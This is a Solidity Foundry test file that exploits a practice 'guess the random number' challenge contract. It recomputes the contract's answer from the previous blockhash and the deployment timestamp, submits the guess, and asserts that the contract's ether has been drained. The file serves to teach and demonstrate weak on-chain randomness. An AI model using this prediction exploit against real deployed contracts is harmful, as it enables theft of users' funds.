
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public challenge;
    
    uint256 deploymentBlockNumber;
    uint256 deploymentTimestamp;

    function setUp() public {
        deploymentBlockNumber = block.number;
        deploymentTimestamp = block.timestamp;
        
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue() public {
        
        // --- 1. Constraints ---
        // The answer was computed at deployment using:
        // - blockhash(block.number - 1): hash of the previous block
        // - block.timestamp: timestamp at deployment
        
        // --- 2. State Configuration ---
        
        // Fund the attacker (this test contract) with enough ether to make a guess
        vm.deal(address(this), 1 ether);

        // --- 3. Replication & Assertion ---
        
        // PREDICT THE OUTCOME
        // Replicate the vulnerable logic locally inside the test.
        // We use the same block properties that were used during deployment.
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(deploymentBlockNumber - 1), 
            deploymentTimestamp
        ))));
        
        // EXECUTE
        // Call the guess method with our predicted answer
        challenge.guess{value: 1 ether}(predictedAnswer);

        // ASSERT PREDICTABILITY
        // Prove that we successfully drained the contract by guessing correctly
        // If isComplete() returns true, the contract balance is 0, meaning we won
        assertTrue(challenge.isComplete(), "Failed to predict the random number");
        
        // Additional assertion: we should have received 2 ether (our 1 ether + the contract's 1 ether)
        assertEq(address(this).balance, 2 ether, "Did not receive the expected payout");
    }
    
    // Required to receive ether from the challenge contract
    receive() external payable {}

    fallback() external payable {}
}
